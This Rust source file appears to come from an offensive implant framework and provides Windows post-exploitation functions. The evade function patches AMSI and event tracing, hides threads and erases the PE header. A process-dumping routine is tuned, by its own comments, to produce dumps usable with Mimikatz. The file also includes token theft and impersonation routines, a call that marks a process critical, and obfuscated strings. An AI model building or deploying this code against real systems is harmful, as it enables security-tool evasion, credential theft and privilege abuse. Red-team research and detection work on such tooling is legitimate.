// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#![no_implicit_prelude]
#![cfg(target_family = "windows")]

use core::alloc::Allocator;
use core::str::from_utf8_unchecked;

use crate::data::blob::Blob;
use crate::data::str::{Fiber, MaybeString};
use crate::data::time::Time;
use crate::device::winapi::{self, MinDumpOutput, SecurityQualityOfService, SessionHandle};
use crate::device::{Address, Evasion, Login};
use crate::env::{split_paths, var, var_os, PATH};
use crate::fs::exists;
use crate::io::{self, Error, ErrorKind, Write};
use crate::path::PathBuf;
use crate::prelude::*;
use crate::process::Filter;
use crate::util::crypt;

pub const SHELL_ARGS: [u8; 2] = [b'/', b'c'];
pub const SHELL_ARGS_ALT: [u8; 2] = [b'-', b'c'];

const COM: [u16; 8] = [
    b'\\' as u16,
    b'c' as u16,
    b'm' as u16,
    b'd' as u16,
    b'.' as u16,
    b'e' as u16,
    b'x' as u16,
    b'e' as u16,
];
const COMSPEC: [u16; 7] = [
    b'C' as u16,
    b'o' as u16,
    b'm' as u16,
    b'S' as u16,
    b'p' as u16,
    b'e' as u16,
    b'c' as u16,
];

#[inline]
pub fn is_debugged() -> bool {
    winapi::is_debugged()
}
#[inline]
pub fn home_dir() -> Option<PathBuf> {
    if let Ok(s) = var(crypt::get_or(0, "USERPROFILE")) {
        return Some(s.into());
    }
    // 0x20008 - TOKEN_READ | TOKEN_QUERY
    winapi::current_token(0x20008)
        .and_then(winapi::GetUserProfileDirectory)
        .map_or(None, |v| Some(v.into()))
}
#[inline]
pub fn revert_to_self() -> io::Result<()> {
    winapi::RevertToSelf().map_err(Error::from)
}
#[inline]
pub fn evade(flags: Evasion) -> io::Result<()> {
    if flags & Evasion::WIN_PATCH_AMSI != 0 {
        winapi::patch_asmi()?;
    }
    if flags & Evasion::WIN_PATCH_TRACE != 0 {
        winapi::patch_tracing()?;
    }
    if flags & Evasion::WIN_HIDE_THREADS != 0 {
        winapi::hide_thread(winapi::CURRENT_THREAD)?;
    }
    if flags & Evasion::ERASE_HEADER != 0 {
        winapi::erase_pe_header()?;
    }
    Ok(())
}
pub fn shell_in<A: Allocator>(alloc: A) -> Fiber<A> {
    if let Some(p) = winapi::GetEnvironment()
        .iter()
        .find(|v| v.is_key(&COMSPEC))
        .and_then(|d| d.value_as_blob())
        .map(|v| v.to_string())
    {
        if exists(&p) {
            return p.into_alloc(alloc);
        }
    }
    winapi::system_dir()
        .iter()
        .chain(COM.iter())
        .map(|v| *v as u8)
        .collect::<Blob<u8, 256>>()
        .into_alloc(alloc)
}
#[inline]
pub fn set_critical(is_critical: bool) -> io::Result<bool> {
    winapi::acquire_debug();
    let r = winapi::RtlSetProcessIsCritical(is_critical).map_err(Error::from);
    winapi::release_debug();
    r
}
pub fn powershell_in<A: Allocator>(alloc: A) -> Option<Fiber<A>> {
    let b = crypt::get_or(0, "powershell.exe");
    for i in split_paths(&var_os(unsafe { from_utf8_unchecked(&PATH) })?) {
        let r = i.join(b);
        if exists(&r) {
            return Some(r.to_string_lossy().into_alloc(alloc));
        }
    }
    None
}
#[inline]
pub fn whoami_in<A: Allocator>(alloc: A) -> io::Result<Fiber<A>> {
    match winapi::local_user() {
        Err(e) => Err(Error::from(e)),
        Ok(v) => Ok(v.into_alloc(alloc)),
    }
}
#[inline]
pub fn set_process_name(_cmd: impl AsRef<str>) -> io::Result<bool> {
    // TODO(dij): Due to how rust handles the args, we can't easily
    //            grab a pointer to it to change it. Maybe in the future??.
    Err(ErrorKind::Unsupported.into())
}
#[inline]
pub fn hostname_in<A: Allocator>(alloc: A) -> io::Result<Fiber<A>> {
    let n = winapi::GetComputerName()?;
    if let Some(i) = n.as_bytes().iter().position(|v| *v == b'.') {
        Ok((&n[0..i]).into_alloc(alloc))
    } else {
        Ok(n.into_alloc(alloc))
    }
}
pub fn impersonate<A: Allocator>(proc: &Filter<A>) -> io::Result<()> {
    if impersonate_thread(proc).is_ok() {
        return Ok(());
    }
    // 0x2000F - TOKEN_READ (STANDARD_RIGHTS_READ | TOKEN_QUERY) |
    //            TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE
    //
    // NOTE(dij): Might need to change this to "0x200EF" which adds "TOKEN_WRITE"
    //            access. Also not sure if we need "TOKEN_IMPERSONATE" or
    //            "TOKEN_ASSIGN_PRIMARY" as we're duplicating it.
    //
    // 0x2000000 - MAXIMUM_ALLOWED
    // 0x2       - SecurityImpersonation
    // 0x2       - TokenImpersonation
    winapi::SetThreadToken(
        winapi::CURRENT_THREAD,
        winapi::DuplicateTokenEx(proc.token_func(0x2000F, None)?, 0x2000000, None, 2, 2)?,
    )
    .map_err(Error::from)
}
#[inline]
pub fn impersonate_thread<A: Allocator>(proc: &Filter<A>) -> io::Result<()> {
    // 0x0200 - THREAD_DIRECT_IMPERSONATION
    let i = SecurityQualityOfService::level(2);
    winapi::NtImpersonateThread(winapi::CURRENT_THREAD, proc.thread_func(0x200, None)?, &i).map_err(Error::from)
}
pub fn logins_in<A: Allocator + Clone>(alloc: A) -> io::Result<Vec<Login<A>, A>> {
    let h = SessionHandle::default();
    let s = winapi::WTSGetSessions(&h)?;
    if s.is_empty() {
        return Ok(Vec::new_in(alloc));
    }
    let mut o = Vec::with_capacity_in(s.len(), alloc.clone());
    for i in s {
        if i.status >= 6 && i.status <= 9 {
            continue;
        }
        o.push(Login {
            id:         i.id,
            from:       Address::from(i.addr),
            user:       if i.domain.is_empty() {
                i.user.into_alloc(alloc.clone())
            } else {
                let mut t = i.domain.into_alloc(alloc.clone());
                t.push('\\');
                t.push_str(&i.user);
                t
            },
            host:       i.host.into_alloc(alloc.clone()),
            status:     i.status,
            last_input: Time::from(i.last_input),
            login_time: Time::from(i.login_time),
        });
    }
    o.sort();
    Ok(o)
}
pub fn mounts_in<A: Allocator + Clone>(alloc: A) -> io::Result<Vec<Fiber<A>, A>> {
    let d = winapi::GetLogicalDrives()?;
    let mut o = Vec::new_in(alloc.clone());
    o.reserve_exact(26);
    for i in 0..26 {
        if (d & (1 << i)) == 0 {
            continue;
        }
        let mut b = Fiber::new_in(alloc.clone());
        let t = unsafe { b.as_mut_vec() };
        t.push(b'A' + i);
        t.extend_from_slice(&[b':', b'\\']);
        o.push(b);
    }
    o.sort();
    Ok(o)
}
pub fn dump_process<A: Allocator>(proc: &Filter<A>, w: &mut impl Write) -> io::Result<usize> {
    if !winapi::is_min_windows_vista() {
        // TODO(dij): We could bypass this restriction using a File of Pipe, but
        //            the File option would be an OpSec issue and I don't to force
        //            make that choice for the user. Pipe doesn't seem to be
        //            accepted by the function as a Handle either.
        return Err(ErrorKind::Unsupported.into());
    }
    // 0x450 - PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE
    let h = proc.handle_func(0x450, None)?;
    winapi::acquire_debug();
    let p = winapi::GetProcessID(&h)?;
    if p == winapi::GetCurrentProcessID() {
        winapi::release_debug();
        return Err(ErrorKind::ConnectionRefused.into());
    }
    // MiniDump Flags (MINIDUMP_TYPE)
    //
    //      0x2 | MiniDumpWithFullMemory
    //      0x4 | MiniDumpWithHandleData
    // ======== | [ Windows XP Support Ends Here ]
    //     0x20 | MiniDumpWithUnloadedModules
    // ======== | [ Windows XP SP2 / Server 2003 Support Ends Here ]
    //    0x800 | MiniDumpWithFullMemoryInfo
    //   0x1000 | MiniDumpWithThreadInfo
    // ======== | [ Windows 7 Support Ends Here ]
    //  0x20000 | MiniDumpIgnoreInaccessibleMemory
    // ======== | [ We Stop Here ]
    // 0x400000 | MiniDumpWithIptTrace
    // ======== | [ ^ Not Needed ]
    // -------- |
    // 0x421826 | Total Flags for a Standard MiniDump on Win10.
    //
    // NOTE(dij): Divergence from Golang. This function will change the flags
    //            based on the underlying OS version support to potentially
    //            gather more data.
    let f = if winapi::is_windows_xp() {
        0x6 // MiniDumpWithFullMemory | MiniDumpWithHandleData
            // This is enough for WinXp/Server 2003 for it to work with
            // Mimikatz.
    } else if winapi::is_min_windows_8() {
        0x21826
        // MiniDumpWithFullMemory | MiniDumpWithHandleData |
        // MiniDumpWithUnloadedModules | MiniDumpWithFullMemoryInfo |
        // MiniDumpWithThreadInfo | MiniDumpIgnoreInaccessibleMemory
    } else {
        0x1826
        // MiniDumpWithFullMemory | MiniDumpWithHandleData |
        // MiniDumpWithUnloadedModules | MiniDumpWithFullMemoryInfo |
        // MiniDumpWithThreadInfo
    };
    let r = winapi::MiniDumpWriteDump(h, p, f, MinDumpOutput::Writer(w));
    winapi::release_debug(); // Release Debug First.
    r.map_err(Error::from)
}
#[inline]
pub fn impersonate_user<U: AsRef<str>, M: MaybeString>(user: U, domain: M, pass: M) -> io::Result<()> {
    // 0x2       - LOGON32_LOGON_INTERACTIVE
    // 0x2000000 - MAXIMUM_ALLOWED
    // 0x2       - SecurityImpersonation
    winapi::SetThreadToken(
        winapi::CURRENT_THREAD,
        winapi::DuplicateTokenEx(
            winapi::LoginUser(user, domain, pass, 0x2, 0)?,
            0x2000000,
            None,
            2,
            2,
        )?,
    )
    .map_err(Error::from)
}
#[inline]
pub fn impersonate_user_network<U: AsRef<str>, M: MaybeString>(user: U, domain: M, pass: M) -> io::Result<()> {
    // 0x9       - LOGON32_LOGON_NEW_CREDENTIALS
    // 0x3       - LOGON32_PROVIDER_WINNT50
    // 0x2000000 - MAXIMUM_ALLOWED
    // 0x2       - SecurityImpersonation
    winapi::SetThreadToken(
        winapi::CURRENT_THREAD,
        winapi::DuplicateTokenEx(
            winapi::LoginUser(user, domain, pass, 0x9, 0x3)?,
            0x2000000,
            None,
            2,
            2,
        )?,
    )
    .map_err(Error::from)
}
